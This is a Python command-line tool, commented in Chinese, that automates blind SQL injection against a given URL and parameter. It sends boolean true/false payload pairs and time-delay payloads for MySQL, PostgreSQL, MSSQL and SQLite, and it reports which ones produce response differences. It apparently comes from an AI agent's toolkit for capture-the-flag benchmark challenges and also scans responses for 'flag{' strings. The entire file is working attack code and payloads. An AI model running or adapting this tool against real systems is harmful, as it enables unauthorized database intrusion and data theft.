#!/usr/bin/env python3
"""blind-sqli.py -- 无回显 SQL 注入：布尔盲注 + 时间盲注（一次跑完一批变体）。

为什么要有（2026-11-14 实测）：xben-088 的三种 SQLi 全部返回 200 且无回显，
  agent 在限时内写不出可用的盲注脚本，只能放弃。本工具把「布尔差分 + 时间延迟」
  两类判据做成一次调用，直接给出哪个 payload 让响应产生了稳定差异。

用法:
  python3 tools/blind-sqli.py <url> --param username --method POST --extra password=x
  python3 tools/blind-sqli.py <url> --param id --cookie "PHPSESSID=abc"
  python3 tools/blind-sqli.py <url> --param id --db mysql|sqlite|postgres|mssql
"""
from __future__ import annotations

import argparse
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# 布尔盲注对：真 / 假 应该产生**不同**响应
BOOL_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1--", "1 AND 1=2--"),
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1) AND 1=1--", "1) AND 1=2--"),
]

# 时间盲注：按数据库类型给延迟表达式
SLEEP = {
    "mysql": ("SLEEP(2)", "SLEEP(0)"),
    "postgres": ("pg_sleep(2)", "pg_sleep(0)"),
    "mssql": ("WAITFOR DELAY '0:0:2'", "WAITFOR DELAY '0:0:0'"),
    "sqlite": ("1=1 AND randomblob(100000000)", "1=1"),
}
TIME_TEMPLATES = [
    "1 AND {on}",
    "1' AND {on}--",
    "1) AND {on}--",
    "1; {on}--",
]


def fetch(url, method, data, headers, timeout=15.0):
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read(120000)
            return r.status, len(raw), raw, time.time() - t0
    except urllib.error.HTTPError as e:
        raw = e.read(120000)
        return e.code, len(raw), raw, time.time() - t0
    except Exception:
        return 0, 0, b"", time.time() - t0


def send(url, method, param, payload, extra, headers):
    d = dict(extra)
    d[param] = payload
    if method.upper() == "GET":
        sep = "&" if "?" in url else "?"
        d.update(dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query)))
        base = url.split("?")[0]
        return fetch(base + "?" + urllib.parse.urlencode(d), "GET", None, headers)
    return fetch(url, "POST", d, headers)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--param", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--extra", default="")
    ap.add_argument("--cookie", default="")
    ap.add_argument("--db", default="mysql", choices=list(SLEEP))
    ap.add_argument("--delay-threshold", type=float, default=1.2)
    a = ap.parse_args()

    extra = {}
    for kv in a.extra.split("&"):
        if "=" in kv:
            k, v = kv.split("=", 1)
            extra[k] = v
    headers = {"User-Agent": "Mozilla/5.0"}
    if a.cookie:
        headers["Cookie"] = a.cookie

    # 基线（正常值）
    base = send(a.url, a.method, a.param, "1", extra, headers)
    print("baseline: code=%s len=%s" % (base[0], base[1]))
    if base[0] == 0:
        print("连不上目标，退出")
        return 2

    found = []

    print()
    print("=== 1) 布尔盲注差分（真 vs 假 响应应不同）")
    for t, f in BOOL_PAIRS:
        rt = send(a.url, a.method, a.param, t, extra, headers)
        rf = send(a.url, a.method, a.param, f, extra, headers)
        same = (rt[0] == rf[0] and rt[1] == rf[1])
        flag = ""
        for r in (rt, rf):
            m = r[2].decode("utf-8", "replace")
            i = m.lower().find("flag{")
            if i >= 0:
                flag = m[i:i + 120].split("}")[0] + "}"
        if not same and rt[0] != 0:
            print("  [差异] TRUE(%s/%d) vs FALSE(%s/%d)  payload=%r" % (rt[0], rt[1], rf[0], rf[1], t))
            print("         对照=%r" % f)
            found.append(("BOOLEAN", t, f, rt[1], rf[1]))
        elif flag:
            print("  [FLAG] %s" % flag)
            print("FOUND_FLAG=" + flag)
            return 0
        else:
            print("  [相同] %-22r vs %-22r (%s/%d)" % (t, f, rt[0], rt[1]))

    print()
    print("=== 2) 时间盲注（延迟 >= %.1fs 视为注入成功）" % a.delay_threshold)
    on_expr, off_expr = SLEEP[a.db]
    for tpl in TIME_TEMPLATES:
        on = tpl.format(on=on_expr)
        off = tpl.format(on=off_expr)
        try:
            r_on = send(a.url, a.method, a.param, on, extra, headers)
            r_off = send(a.url, a.method, a.param, off, extra, headers)
        except Exception as e:
            print("  [异常] %r: %s" % (tpl, e))
            continue
        d_on, d_off = r_on[3], r_off[3]
        hit = d_on >= a.delay_threshold and d_on - d_off >= a.delay_threshold * 0.7
        mark = "  <<< TIME-BLIND" if hit else ""
        print("  %-30r on=%.2fs off=%.2fs%s" % (tpl, d_on, d_off, mark))
        if hit:
            found.append(("TIME", on, off, round(d_on, 2), round(d_off, 2)))

    print()
    if found:
        print("=== 结论：找到 %d 个可用注入点 ===" % len(found))
        for kind, p, c, x, y in found:
            print("  [%s] payload=%r  对照=%r  (%s vs %s)" % (kind, p, c, x, y))
    else:
        print("=== 未发现盲注信号：换参数/换编码（大小写、注释截断 /**/、%00、二次编码） ===")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())